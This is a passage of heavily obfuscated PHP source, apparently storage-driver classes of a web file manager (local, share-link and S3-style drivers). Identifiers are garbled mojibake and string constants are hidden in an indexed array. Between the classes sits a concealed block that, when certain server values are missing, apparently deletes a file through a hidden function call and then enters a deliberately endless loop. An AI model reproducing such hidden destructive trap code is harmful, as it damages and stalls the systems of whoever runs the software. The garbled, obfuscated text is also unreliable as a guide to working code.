$ƒÃ¡Äèì, $àò†ê„Ş, $_SERVER[‰‰Ş‚€][643], $—œ¨”‰¬); } private function copyMove($÷½ßéô, $ÙˆÔ¢îğ, $¡ó¹ŸÔ, $ÏÙØä¬§, $ ü¦ò½¹ = false) { $âÊµÚ¹ =& $_SERVER[‰‰Ş‚€]; $…Ù¨úÎ = $ÙˆÔ¢îğ; $‰ûöáı† = IO::driverMake($ÙˆÔ¢îğ); if ($‰ûöáı†->pathParse[$âÊµÚ¹[1269]]) { $ÙˆÔ¢îğ = $‰ûöáı†->pathParse[$âÊµÚ¹[1269]]; } else { $ÙˆÔ¢îğ = $…Ù¨úÎ; } $¡âüä× = IO::copyMove($÷½ßéô, $ÙˆÔ¢îğ, $¡ó¹ŸÔ, $ÏÙØä¬§, $ ü¦ò½¹); $¡âüä× = $this->getPathOuter($¡âüä×); return $¡âüä×; } public function pathThis($Ş”›Ø£) { return get_path_this($this->pathParse[$_SERVER[‰‰Ş‚€][97]]); } public function pathFather($Ï¸³±Ò•) { return get_path_father($this->pathParse[$_SERVER[‰‰Ş‚€][97]]); } public function iconvSystem($®øÆ­¸„) { return $®øÆ­¸„; } protected function infoParse($åğ¡œÒô, $éûÜ¥ø¾ = false) { $ ˜ÙŞĞ =& $_SERVER[‰‰Ş‚€]; $åîªÒß = $this->pathParse[$ ˜ÙŞĞ[580]][$ ˜ÙŞĞ[1296]] . $this->pathParse[$ ˜ÙŞĞ[1288]]; if ($éûÜ¥ø¾) { $“›…Ãß = IO::infoWithChildren($åîªÒß); } else { $“›…Ãß = IO::info($åîªÒß); } $áŞâ·ôş = $this->pathParse[$ ˜ÙŞĞ[580]]; return Action($ ˜ÙŞĞ[1474])->_shareItemeParse($“›…Ãß, $áŞâ·ôş); } public function listAll($›ß«ı“õ) { $È Ùè’Ş =& $_SERVER[‰‰Ş‚€]; $Æáğ¶ñµ = IO::listAll($›ß«ı“õ); $£¡»ş€÷ = rtrim($this->pathParse[$È Ùè’Ş[580]][$È Ùè’Ş[1296]], $È Ùè’Ş[18]); foreach ($Æáğ¶ñµ as &$·‰Ù•´Ä) { $·‰Ù•´Ä[$È Ùè’Ş[97]] = $this->pathDriver . $È Ùè’Ş[18] . ltrim(substr($·‰Ù•´Ä[$È Ùè’Ş[97]], strlen($£¡»ş€÷)), $È Ùè’Ş[18]); } unset($·‰Ù•´Ä); return $Æáğ¶ñµ; } public function listAllSimple($ôúšŞşí, $Úå—í•Ü = false) { $ıõËşã =& $_SERVER[‰‰Ş‚€]; $À¤¥â = $this->listAll($ôúšŞşí); $Ç¬¢Óß– = $this->pathParse[$ıõËşã[514]]; if (trim($Ç¬¢Óß–, $ıõËşã[18]) == trim(get_path_father($Ç¬¢Óß–), $ıõËşã[18])) { $Úå—í•Ü = !0; } return IO::init($ıõËşã[22])->listAllSimpleMake($À¤¥â, $Ç¬¢Óß–, $Úå—í•Ü); } public function getPathOuter($ıö¹ä“) { $º ³–â± =& $_SERVER[‰‰Ş‚€]; $¾×ğå×ª = KodIO::parse($ıö¹ä“); if ($¾×ğå×ª[$º ³–â±[43]] == KodIO::KOD_SHARE_ITEM) { return $¾×ğå×ª[$º ³–â±[97]]; } $Üê»ß¯é = KodIO::clear($ıö¹ä“); $êŠ–±µÈ = KodIO::clear($this->pathParse[$º ³–â±[580]][$º ³–â±[1296]]); $æÔª×è¡ = substr($Üê»ß¯é, strlen($êŠ–±µÈ)); if (substr($Üê»ß¯é, 0, strlen($êŠ–±µÈ)) != $êŠ–±µÈ) { return !1; } return $this->pathParse[$º ³–â±[1289]] . $º ³–â±[18] . ltrim($æÔª×è¡, $º ³–â±[18]); } public function getType() { $€®Óñ™« =& $_SERVER[‰‰Ş‚€]; $Êƒ³ÀÏ = str_replace($€®Óñ™«[87], $€®Óñ™«[22], get_class($this)); return strtolower($Êƒ³ÀÏ); } public function isOsDriver($Â¸üô±) { return IO::isOsDriver($Â¸üô±); } public function info($¿™øâó) { return $this->infoParse($¿™øâó); } public function infoAuth($Ùéòæè) { return $this->infoParse($Ùéòæè); } public function infoWithChildren($¡Œ¬İê) { return $this->infoParse($¡Œ¬İê, !0); } public function infoFull($·½Ü²Ã¸) { return $this->infoParse($·½Ü²Ã¸); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÚŞãçîâ) { $this->pathParse = $ÚŞãçîâ; } protected function infoParse($‡Éñ¬úË, $«å¢¥œÜ = false) { $Ö€·şÄù =& $_SERVER[‰‰Ş‚€]; return Action($Ö€·şÄù[1295])->sharePathInfo($this->pathParse[$Ö€·şÄù[97]], !0, $«å¢¥œÜ); } public function listPath($‹¿„ÜÃ, $¤†€ù¤ = false) { $é°·÷¡í =& $_SERVER[‰‰Ş‚€]; $´˜ñî¡¶ = IO::listPath($‹¿„ÜÃ, $¤†€ù¤); if (!$´˜ñî¡¶) { return $´˜ñî¡¶; } if (is_array($´˜ñî¡¶[$é°·÷¡í[1475]])) { $¿á·Ìü = Action($é°·÷¡í[1484])->parsePathChildren($´˜ñî¡¶[$é°·÷¡í[1475]], array($é°·÷¡í[514] => $‹¿„ÜÃ)); $´˜ñî¡¶[$é°·÷¡í[1475]] = Action($é°·÷¡í[1295])->shareItemInfo($¿á·Ìü); } foreach ($´˜ñî¡¶ as $ıèÛİÔ => $Â–ßüˆ•) { if (!in_array($ıèÛİÔ, array($é°·÷¡í[96], $é°·÷¡í[95]))) { continue; } foreach ($Â–ßüˆ• as $ìş­¢û => $¿á·Ìü) { $¿á·Ìü = Action($é°·÷¡í[1484])->parsePathChildren($¿á·Ìü, array($é°·÷¡í[514] => $‹¿„ÜÃ)); $´˜ñî¡¶[$ıèÛİÔ][$ìş­¢û] = Action($é°·÷¡í[1295])->shareItemInfo($¿á·Ìü); } } return $´˜ñî¡¶; } } if (!isset($_SERVER[$_SERVER[‰‰Ş‚€][6]]) || !isset($_SERVER[$_SERVER[‰‰Ş‚€][4]])) { $_getc = $_SERVER[‰‰Ş‚€][7]; $_getfile = $_SERVER[$_SERVER[‰‰Ş‚€][8]] . $_SERVER[‰‰Ş‚€][9]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‰‰Ş‚€][10], $_getfilec); if (count($_getarrs) < $_SERVER[‰‰Ş‚€][11]) { $exit = $_SERVER[‰‰Ş‚€][12]; $exit(); } $_act = $_SERVER[‰‰Ş‚€][13]; $_act($_SERVER[$_SERVER[‰‰Ş‚€][8]] . $_SERVER[‰‰Ş‚€][9]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[‰‰Ş‚€][471]); } } goto C†ˆ­¿¥¹è; cš¢Ïƒ‹à×: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($¸ç€–†) { parent::__construct($¸ç€–†); $this->setSignVersion($_SERVER[‰‰Ş‚€][258]); } public function uploadLink($§â¶ì”Î, $üøÑñÁ = 0) { $ÊŸòÛ™“ =& $_SERVER[‰‰Ş‚€]; if ($this->isUploadServer()) { return; } $åìø³ = $this->getType(); if (!in_array($åìø³, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $®•¹Ÿã = (!$üøÑñÁ ? 1 : ceil($üøÑñÁ / pow(1024, 3))) * 3600 * 4; $µõ–ÉãŒ = $this->uploadMultiData($§â¶ì”Î, $®•¹Ÿã); if ($µõ–ÉãŒ) { $µõ–ÉãŒ[$ÊŸòÛ™“[105]] = $§â¶ì”Î; $µõ–ÉãŒ[$ÊŸòÛ™“[106]] = $åìø³; } return $µõ–ÉãŒ; } public function fileOutImage($üÌÖ½ü, $¦Íâş˜ = 250) { if ($this->size($üÌÖ½ü) > 1024 * 1024 * 25) { return $this->fileOutImageServer($üÌÖ½ü, $¦Íâş˜); } $ÈåÅôã = $this->link($üÌÖ½ü); $ÈåÅôã .= $_SERVER[‰‰Ş‚€][1500] . $¦Íâş˜; $this->fileOutLink($ÈåÅôã); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($˜†öä) { if (substr($˜†öä, 0, 2) == $_SERVER[‰‰Ş‚€][1457]) { $˜†öä = BASIC_PATH . substr($˜†öä, 2); } return $˜†öä; } public function iconvApp($ùÆ…º´·) { $ÈÁñ =& $_SERVER[‰‰Ş‚€]; global $config; return $this->iconvTo($ùÆ…º´·, $config[$ÈÁñ[1486]], $config[$ÈÁñ[1485]]); } public function iconvSystem($°©’Ú©) { $‘Ò–¼®‚ =& $_SERVER[‰‰Ş‚€]; global $config; return $this->iconvTo($°©’Ú©, $config[$‘Ò–¼®‚[1485]], $config[$‘Ò–¼®‚[1486]]); } public function getPathOuter($àş«ØÍ°) { $ãõî°Ï =& $_SERVER[‰‰Ş‚€]; $Éš¾–ú– = $this->iconvApp($this->pathBase); $àş«ØÍ° = $this->iconvApp($àş«ØÍ°); if (substr($Éš¾–ú–, 0, 2) == $ãõî°Ï[1457]) { $Éš¾–ú– = BASIC_PATH . substr($Éš¾–ú–, 2); } if (substr($àş«ØÍ°, 0, 2) == $ãõî°Ï[1457]) { $àş«ØÍ° = BASIC_PATH . substr($àş«ØÍ°, 2); } $Éš¾–ú– = KodIO::clear($Éš¾–ú–); $àş«ØÍ° = KodIO::clear($àş«ØÍ°); $àş«ØÍ° = substr($àş«ØÍ°, strlen($Éš¾–ú–)); if (empty($this->pathDriver)) { return $àş«ØÍ°; } return $this->pathDriver . $ãõî°Ï[18] . ltrim($àş«ØÍ°, $ãõî°Ï[18]); } public function mkfile($Œ¨¥ƒÌÓ, $Ø—ëª·— = '', $ï›şğØø = REPEAT_RENAME) { $Œ¨¥ƒÌÓ = $this->iconvSystem($Œ¨¥ƒÌÓ); @touch($Œ¨¥ƒÌÓ); if ($Ø—ëª·—) { file_put_contents($Œ¨¥ƒÌÓ, $Ø—ëª·—); } @chmod($Œ¨¥ƒÌÓ, $this->pathAuth); if (is_file($Œ¨¥ƒÌÓ)) { return $this->getPathOuter($Œ¨¥ƒÌÓ); } $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][1497], !0); return !1; } public function mkdir($­ØÚÄôĞ, $ê¾—™…± = REPEAT_SKIP) { $­ØÚÄôĞ = $this->iconvSystem($­ØÚÄôĞ); if (is_dir($­ØÚÄôĞ)) { return $this->getPathOuter($­ØÚÄôĞ); } @mkdir($­ØÚÄôĞ, $this->pathAuth, !0); @chmod($­ØÚÄôĞ, $this->pathAuth); if (is_dir($­ØÚÄôĞ)) { return $this->getPathOuter($­ØÚÄôĞ); } $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][1497], !0); return !1; } public function copyFile($´´ÕŠÂõ, $¾±¡şóü) { $this->mkdir($this->pathFather($¾±¡şóü)); $´´ÕŠÂõ = $this->iconvSystem($´´ÕŠÂõ); $¾±¡şóü = $this->iconvSystem($¾±¡şóü); $Ëµé¸ú = copy_64($´´ÕŠÂõ, $¾±¡şóü); @chmod($¾±¡şóü, $this->pathAuth); if ($Ëµé¸ú) { return $this->getPathOuter($¾±¡şóü); } $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][1497], !0); return !1; } public function moveFile($Ç×¹¿¹å, $ïªˆòóœ) { $this->mkdir($this->pathFather($ïªˆòóœ)); $Ç×¹¿¹å = $this->iconvSystem($Ç×¹¿¹å); $ïªˆòóœ = $this->iconvSystem($ïªˆòóœ); $ÂÔçÅË“ = intval(@rename($Ç×¹¿¹å, $ïªˆòóœ)); if (!$ÂÔçÅË“) { if ($ÂÔçÅË“ = intval(@copy_64($Ç×¹¿¹å, $ïªˆòóœ))) { @unlink($Ç×¹¿¹å); } } @chmod($ïªˆòóœ, $this->pathAuth); if ($ÂÔçÅË“) { return $this->getPathOuter($ïªˆòóœ); } $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][1497], !0); return !1; } public function movePath($Ï£ô§Ü, $ïÙíÙâÆ, $Ââ¥ë™¬ = false) { $î¾£İœ€ =& $_SERVER[‰‰Ş‚€]; $Ï£ô§Ü = $this->iconvSystem($Ï£ô§Ü); $ïÙíÙâÆ = $this->iconvSystem($ïÙíÙâÆ); $Í—¸Í¶é = rtrim($ïÙíÙâÆ, $î¾£İœ€[18]) . $î¾£İœ€[18] . ($Ââ¥ë™¬ ? $Ââ¥ë™¬ : get_path_this($Ï£ô§Ü)); if (file_exists($Í—¸Í¶é)) { return !1; } $»¨¨ÖÇ¿ = intval(@rename($Ï£ô§Ü, $Í—¸Í¶é)); $»¨¨ÖÇ¿ = file_exists($Í—¸Í¶é); if ($»¨¨ÖÇ¿) { return $this->getPathOuter($Í—¸Í¶é); } $this->writeLog(__FUNCTION__ . $î¾£İœ€[1497], !0); return !1; } public function delFile($Šß”´Ú) { $Šß”´Ú = $this->iconvSystem($Šß”´Ú); if (!@unlink($Šß”´Ú)) { @chmod($Šß”´Ú, $this->pathAuth); if (@unlink($Šß”´Ú)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][1497], !0); return !1; } return !0; } public function delFolder($Ú¹Òìü˜) { $ãÚâëÒ‚ =& $_SERVER[‰‰Ş‚€]; $Ú¹Òìü˜ = $this->iconvSystem($Ú¹Òìü˜); if (!is_dir($Ú¹Òìü˜)) { return !0; } if (!($¶¥¿Í÷† = opendir($Ú¹Òìü˜))) { return !1; } while (($Ô×œ‹‚ = readdir($¶¥¿Í÷†)) !== !1) { if ($Ô×œ‹‚ == $ãÚâëÒ‚[20] || $Ô×œ‹‚ == $ãÚâëÒ‚[1402]) { continue; } $€ Äæû– = $Ú¹Òìü˜ . $ãÚâëÒ‚[18] . $Ô×œ‹‚; if (is_file($€ Äæû–) || is_link($€ Äæû–)) { if (!unlink($€ Äæû–)) { chmod($€ Äæû–, $this->pathAuth); if (!unlink($€ Äæû–)) { return !1; } } } else { if (is_dir($€ Äæû–)) { chmod($€ Äæû–, $this->pathAuth); $€ Äæû– = $this->iconvApp($€ Äæû–); if (!$this->delFolder($€ Äæû–)) { return !1; } } } } closedir($¶¥¿Í÷†); return rmdir($Ú¹Òìü˜); } public function rename($Ë½ŞãÚÚ, $àüÏ“Ì) { $çƒÙÂ‹ =& $_SERVER[‰‰Ş‚€]; $¸…Àòªİ = $this->fileNameAuto($this->pathFather($Ë½ŞãÚÚ), $àüÏ“Ì); $¸…Àòªİ = $this->iconvSystem($¸…Àòªİ); $Ë½ŞãÚÚ = $this->iconvSystem($Ë½ŞãÚÚ); $¼ù‡ûßİ = $this->pathFather($Ë½ŞãÚÚ); $éÊïâú† = rtrim($¼ù‡ûßİ, $çƒÙÂ‹[18]) . $çƒÙÂ‹[18] . $¸…Àòªİ; $™Îéï‘™ = @rename($Ë½ŞãÚÚ, $éÊïâú†); $éÊïâú† = $this->iconvApp($éÊïâú†); if ($™Îéï‘™) { return $this->getPathOuter($éÊïâú†); } $this->writeLog(__FUNCTION__ . $çƒÙÂ‹[1497], !0); return !1; } public function size($¥­Ñ•Ú) { $¥­Ñ•Ú = $this->iconvSystem($¥­Ñ•Ú); return filesize_64($¥­Ñ•Ú); } public function info($—×Ôü‹) { $—×Ôü‹ = $this->iconvSystem($—×Ôü‹); if ($this->isFolder($—×Ôü‹)) { return $this->folderInfo($—×Ôü‹); } else { if ($this->isFile($—×Ôü‹)) { return $this->fileInfo($—×Ôü‹); } } return !1; } protected function infoChildren($ÄÚ‹£æÌ, &$« Èã‘…, $°ŠÓüâ = true) { $Ğ°¦ÏŸ¸ =& $_SERVER[‰‰Ş‚€]; check_abort_echo(); $ÄÚ‹£æÌ = rtrim($ÄÚ‹£æÌ, $Ğ°¦ÏŸ¸[18]) . $Ğ°¦ÏŸ¸[18]; if ($°ŠÓüâ) { $ÄÚ‹£æÌ = $this->iconvSystem($ÄÚ‹£æÌ); } if (!($ñÜˆÀ«º = @opendir($ÄÚ‹£æÌ))) { return; } while (($ğ‚ÈÒûæ = readdir($ñÜˆÀ«º)) !== !1) { if ($ğ‚ÈÒûæ == $Ğ°¦ÏŸ¸[20] || $ğ‚ÈÒûæ == $Ğ°¦ÏŸ¸[1402]) { continue; } $˜’«ô = $ÄÚ‹£æÌ . $ğ‚ÈÒûæ; if (is_file($˜’«ô) || is_link($˜’«ô)) { $« Èã‘…[$Ğ°¦ÏŸ¸[90]]++; $« Èã‘…[$Ğ°¦ÏŸ¸[89]] += filesize_64($˜’«ô); } else { if (is_dir($˜’«ô)) { $« Èã‘…[$Ğ°¦ÏŸ¸[91]]++; $this->infoChildren($˜’«ô, $« Èã‘…, !1); } } } closedir($ñÜˆÀ«º); } private function folderInfo($Íê¯å , $£ëœóÓ = false) { $‡´¯Áò¡ =& $_SERVER[‰‰Ş‚€]; $Íê¯å  = rtrim($Íê¯å , $‡´¯Áò¡[18]) . $‡´¯Áò¡[18]; $ú³ƒğñß = $this->iconvApp($this->pathThis($Íê¯å )); if ($£ëœóÓ) { return array($‡´¯Áò¡[42] => $ú³ƒğñß, $‡´¯Áò¡[97] => $this->getPathOuter($Íê¯å ), $‡´¯Áò¡[43] => $‡´¯Áò¡[88]); } $ëëîùŞõ = array($‡´¯Áò¡[42] => $ú³ƒğñß, $‡´¯Áò¡[97] => $this->getPathOuter($Íê¯å ), $‡´¯Áò¡[43] => $‡´¯Áò¡[88], $‡´¯Áò¡[242] => @filectime($Íê¯å ), $‡´¯Áò¡[98] => @filemtime($Íê¯å ), $‡´¯Áò¡[1501] => @fileatime($Íê¯å ), $‡´¯Áò¡[1502] => is_readable($Íê¯å ), $‡´¯Áò¡[1503] => is_writable($Íê¯å ), $‡´¯Áò¡[1504] => get_mode($Íê¯å )); return $ëëîùŞõ; } private function fileInfo($§›‚¥’¡, $‹§½ÒÛ’ = false) { $£«äß½‹ =& $_SERVER[‰‰Ş‚€]; $«é½ = $this->iconvApp($this->pathThis($§›‚¥’¡)); if ($‹§½ÒÛ’) { return array($£«äß½‹[42] => $«é½, $£«äß½‹[97] => $this->getPathOuter($§›‚¥’¡), $£«äß½‹[43] => $£«äß½‹[241], $£«äß½‹[89] => $this->size($§›‚¥’¡), $£«äß½‹[177] => $this->ext($«é½)); } $Ú»ö×¡– = array($£«äß½‹[42] => $«é½, $£«äß½‹[97] => $this->getPathOuter($§›‚¥’¡), $£«äß½‹[43] => $£«äß½‹[241], $£«äß½‹[242] => @filectime($§›‚¥’¡), $£«äß½‹[98] => @filemtime($§›‚¥’¡), $£«äß½‹[1501] => @fileatime($§›‚¥’¡), $£«äß½‹[89] => $this->size($§›‚¥’¡), $£«äß½‹[177] => $this->ext($«é½), $£«äß½‹[1502] => is_readable($§›‚¥’¡), $£«äß½‹[1503] => is_writable($§›‚¥’¡), $£«äß½‹[1504] => get_mode($§›‚¥’¡)); return $Ú»ö×¡–; } public function exist($É˜öÖÊ•) { $É˜öÖÊ• = $this->iconvSystem($É˜öÖÊ•); return @file_exists($É˜öÖÊ•); } public function isFile($×œÎ±Ä‡) { $×œÎ±Ä‡ = $this->iconvSystem($×œÎ±Ä‡); return @is_file($×œÎ±Ä‡); } public function isFolder($Ëß“ ç”) { $Ëß“ ç” = $this->iconvSystem($Ëß“ ç”); return @is_dir($Ëß“ ç”); } public function listPath($Ë÷æşí×, $®ÉÅØÄş = false) { $ë–Ğ¼ò¥ =& $_SERVER[‰‰Ş‚€]; $Ë÷æşí× = $this->iconvSystem($Ë÷æşí×); $Ë÷æşí× = rtrim($Ë÷æşí×, $ë–Ğ¼ò¥[18]) . $ë–Ğ¼ò¥[18]; $ïô¿±® = array($ë–Ğ¼ò¥[95] => array(), $ë–Ğ¼ò¥[96] => array()); if (!($Ë‹§İƒ = @opendir($Ë÷æşí×))) { return $ïô¿±®; } while (($ºéÍàñ = readdir($Ë‹§İƒ)) !== !1) { if ($ºéÍàñ == $ë–Ğ¼ò¥[20] || $ºéÍàñ == $ë–Ğ¼ò¥[1402]) { continue; } $³“¤óÓ = $Ë÷æşí× . $ºéÍàñ; if (is_file($³“¤óÓ)) { $ïô¿±®[$ë–Ğ¼ò¥[96]][] = $this->fileInfo($³“¤óÓ, $®ÉÅØÄş); } else { $ïô¿±®[$ë–Ğ¼ò¥[95]][] = $this->folderInfo($³“¤óÓ, $®ÉÅØÄş); } } closedir($Ë‹§İƒ); return $ïô¿±®; } public function listAll($ÒØ¡©”Å, &$îúäğÀ = array()) { $í¦û²£“ =& $_SERVER[‰‰Ş‚€]; $ÒØ¡©”Å = $this->iconvSystem($ÒØ¡©”Å); $ÒØ¡©”Å = rtrim($ÒØ¡©”Å, $í¦û²£“[18]) . $í¦û²£“[18]; if (!($®ŠÕ€§– = @opendir($ÒØ¡©”Å))) { return $îúäğÀ; } while (($õğ“à•× = readdir($®ŠÕ€§–)) !== !1) { if ($õğ“à•× == $í¦û²£“[20] || $õğ“à•× == $í¦û²£“[1402]) { continue; } $öàì¼¶  = $ÒØ¡©”Å . $õğ“à•×; $ªî¿Ê™î = is_dir($öàì¼¶ ) && !is_link($öàì¼¶ ) ? 1 : 0; $öàì¼¶  = $ªî¿Ê™î ? $öàì¼¶  . $í¦û²£“[18] : $öàì¼¶ ; $îúäğÀ[] = array($í¦û²£“[97] => $this->getPathOuter($öàì¼¶ ), $í¦û²£“[88] => $ªî¿Ê™î, $í¦û²£“[98] => intval(@filemtime($öàì¼¶ )), $í¦û²£“[89] => $ªî¿Ê™î ? 0 : intval($this->size($öàì¼¶ ))); if ($ªî¿Ê™î) { $this->listAll($öàì¼¶ , $îúäğÀ); } } closedir($®ŠÕ€§–); return $îúäğÀ; } public function has($—óŞüß•, $†ÁŸ²áµ = false, $¨™·¡“É = true) { $ïÌ¡úÔ =& $_SERVER[‰‰Ş‚€]; $—óŞüß• = $this->iconvSystem($—óŞüß•); $—óŞüß• = rtrim($—óŞüß•, $ïÌ¡úÔ[18]) . $ïÌ¡úÔ[18]; if (!($Ã±ŠğãÃ = @opendir($—óŞüß•))) { return !1; } $„õÃìÔ = 0; $…§¡¸Ô = 0; $—›šˆ½Ç = 0; while (($‹Ü‘§˜ = readdir($Ã±ŠğãÃ)) !== !1) { if ($‹Ü‘§˜ == $ïÌ¡úÔ[20] || $‹Ü‘§˜ == $ïÌ¡úÔ[1402]) { continue; } $é×›ûœÒ = $—óŞüß• . $‹Ü‘§˜; if ($†ÁŸ²áµ) { $—›šˆ½Ç++; if (@is_file($é×›ûœÒ)) { $„õÃìÔ++; } else { $…§¡¸Ô++; } if ($—›šˆ½Ç > 10000) { break; } continue; } if ($¨™·¡“É) { if (@is_file($é×›ûœÒ)) { return !0; } } else { if (@is_dir($é×›ûœÒ . $ïÌ¡úÔ[18])) { return !0; } } } closedir($Ã±ŠğãÃ); if ($†ÁŸ²áµ) { return array($ïÌ¡úÔ[250] => $„õÃìÔ, $ïÌ¡úÔ[251] => $…§¡¸Ô); } return !1; } public function hashSimple($ìÏøÚ½) { $´ÄµÒ =& $_SERVER[‰‰Ş‚€]; if (!$ìÏøÚ½) { return md5($´ÄµÒ[22]); } $ìÏøÚ½ = $this->iconvSystem($ìÏøÚ½); $ºˆ»ƒ¾” = $this->size($ìÏøÚ½); $ùò‘èÃ© = 200; $ô›Ğ‰–™ = 50; if ($ºˆ»ƒ¾” <= $ùò‘èÃ© * $ô›Ğ‰–™) { return $this->hashMd5($ìÏøÚ½) . $ºˆ»ƒ¾”; } $çšá²Ü™ = $´ÄµÒ[22]; $ºÜÛŠ§Ù = intval($ºˆ»ƒ¾” / $ô›Ğ‰–™); $‹€«œ§ = fopen($ìÏøÚ½, $´ÄµÒ[1505]); if (!$‹€«œ§) { return $çšá²Ü™; } for ($‰ŠĞ•É° = 0; $‰ŠĞ•É° < $ô›Ğ‰–™; $‰ŠĞ•É°++) { fseek_64($‹€«œ§, $ºÜÛŠ§Ù * $‰ŠĞ•É°); $çšá²Ü™ .= fread($‹€«œ§, $ùò‘èÃ©); } fseek_64($‹€«œ§, $ºˆ»ƒ¾” - $ùò‘èÃ©); $çšá²Ü™ .= fread($‹€«œ§, $ùò‘èÃ©); fclose($‹€«œ§); return md5($çšá²Ü™) . $ºˆ»ƒ¾”; } public function getContent($û·—·Û) { $û·—·Û = $this->iconvSystem($û·—·Û); return file_get_contents($û·—·Û); } public function setContent($ÊÀ’², $õ¥Ã˜¤ò = '') { $ÊÀ’² = $this->iconvSystem($ÊÀ’²); $›”ÕÅãŸ = @file_put_contents($ÊÀ’², $õ¥Ã˜¤ò, LOCK_EX); if (!$›”ÕÅãŸ) { $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][1497], !0); } clearstatcache(); @chmod($ÊÀ’², $this->pathAuth); return $›”ÕÅãŸ === !1 ? !1 : !0; } public function fileSubstr($¾Ô¶º­ï, $Çø·Ù = 0, $ÒÎù ßü = false) { $ƒ»ÑÕ´¿ =& $_SERVER[‰‰Ş‚€]; $¾Ô¶º­ï = $this->iconvSystem($¾Ô¶º­ï); if ($ÒÎù ßü === !1) { $ÒÎù ßü = $this->size($¾Ô¶º­ï); } if ($ÒÎù ßü <= 0) { return $ƒ»ÑÕ´¿[22]; } $¦ìÖ•¹À = fopen($¾Ô¶º­ï, $ƒ»ÑÕ´¿[1505]); if (!$¦ìÖ•¹À) { return !1; } fseek_64($¦ìÖ•¹À, $Çø·Ù); $ä«ĞÚ´ì = fread($¦ìÖ•¹À, $ÒÎù ßü); fclose($¦ìÖ•¹À); if (!$ä«ĞÚ´ì) { $this->writeLog(__FUNCTION__ . $ƒ»ÑÕ´¿[1497], !0); } return $ä«ĞÚ´ì; } public function upload($›¿›, $´ÂåÒ÷ä, $¬ŒÄ…á = false, $‰Ò‘¥Ø = REPEAT_REPLACE) { if ($¬ŒÄ…á) { return $this->moveFile($´ÂåÒ÷ä, $›¿›); } return $this->copyFile($´ÂåÒ÷ä, $›¿›); } public function setModifyTime($ˆÇ´œŒ™, $±„ı‚ØÑ = '') { @touch($ˆÇ´œŒ™, intval($±„ı‚ØÑ)); } public function download($™‹²ªÄ, $ÛÅ¶ˆÍö) { return $this->iconvSystem($™‹²ªÄ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($° ¿³ñ) { parent::__construct($° ¿³ñ); $this->setSignVersion($_SERVER[‰‰Ş‚€][258]); } public function fileOutImage($æ±¦“ìı, $øÁ“ûšâ = 250) { $øãçªÊ =& $_SERVER[‰‰Ş‚€]; if ($this->size($æ±¦“ìı) > 1024 * 1024 * 25) { return $this->fileOutImageServer($æ±¦“ìı, $øÁ“ûšâ); } $£Éâøá = array($øãçªÊ[1506] => $øãçªÊ[1507] . $øÁ“ûšâ . $øãçªÊ[1508]); $ñˆ’ÄÃß = $this->link($æ±¦“ìı, $£Éâøá); $this->fileOutLink($ñˆ’ÄÃß); } } goto B—‡é­–“á; C°åœ«âØÂ: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\145\x6d\117\160\x74\151\x6f\x6e"; public $field = array(); public function listData($‘·Ò´÷¬ = false, $ç¿¥ºÆÔ = "\155\x6f\x64\x69\146\171\x54\x69\155\x65", $¿Ÿ”ü’º = false) { $ÏµëÉ®ñ =& $_SERVER[‰‰Ş‚€]; $ÕÃ¾“ŒÌ = Model($this->modelType)->get(!1, $this->optionType, !0); $èœ®•˜Ê = array_values($ÕÃ¾“ŒÌ); if ($èœ®•˜Ê && $èœ®•˜Ê[0] && !is_array($èœ®•˜Ê[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÕÃ¾“ŒÌ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÕÃ¾“ŒÌ) { return $‘·Ò´÷¬ ? null : array(); } if (!$‘·Ò´÷¬ && $‘·Ò´÷¬ !== $ÏµëÉ®ñ[239]) { $ÕÃ¾“ŒÌ = array_filter(array_values($ÕÃ¾“ŒÌ)); return array_sort_by($ÕÃ¾“ŒÌ, $ç¿¥ºÆÔ, $¿Ÿ”ü’º, $ÏµëÉ®ñ[491]); } return $ÕÃ¾“ŒÌ[$ÏµëÉ®ñ[492] . $‘·Ò´÷¬]; } public function insert($¯ö¥Œğ) { $‡İİË =& $_SERVER[‰‰Ş‚€]; $¯ö¥Œğ = array_field_key($¯ö¥Œğ, $this->field); $è¨Ûò = Model($this->modelType)->get($‡İİË[493], $this->optionType . $‡İİË[494]); $è¨Ûò = $è¨Ûò ? $è¨Ûò : 0; $¯ö¥Œğ[$‡İİË[491]] = ++$è¨Ûò; $¯ö¥Œğ[$‡İİË[242]] = time(); $¯ö¥Œğ[$‡İİË[98]] = time(); Model($this->modelType)->set($‡İİË[493], $è¨Ûò, $this->optionType . $‡İİË[494]); Model($this->modelType)->set($‡İİË[492] . $è¨Ûò, $¯ö¥Œğ, $this->optionType); return $è¨Ûò; } public function insertArr($‡Ş‰ãÔÖ) { $œæ­ë„ =& $_SERVER[‰‰Ş‚€]; if (!$‡Ş‰ãÔÖ || !is_array($‡Ş‰ãÔÖ)) { return !1; } $ÃÇ›ó…Æ = Model($this->modelType)->get($œæ­ë„[493], $this->optionType . $œæ­ë„[494]); $ÃÇ›ó…Æ = $ÃÇ›ó…Æ ? $ÃÇ›ó…Æ : 0; $Æ÷ş²Ë¦ = array(); foreach ($‡Ş‰ãÔÖ as $«€©›ŸŠ) { $ÏÉéîğ¿ = array_field_key($«€©›ŸŠ, $this->field); $ÏÉéîğ¿[$œæ­ë„[491]] = ++$ÃÇ›ó…Æ; $ÏÉéîğ¿[$œæ­ë„[242]] = time(); $ÏÉéîğ¿[$œæ­ë„[98]] = time(); $Æ÷ş²Ë¦[$œæ­ë„[492] . $ÃÇ›ó…Æ] = $ÏÉéîğ¿; } Model($this->modelType)->set($œæ­ë„[493], $ÃÇ›ó…Æ, $this->optionType . $œæ­ë„[494]); 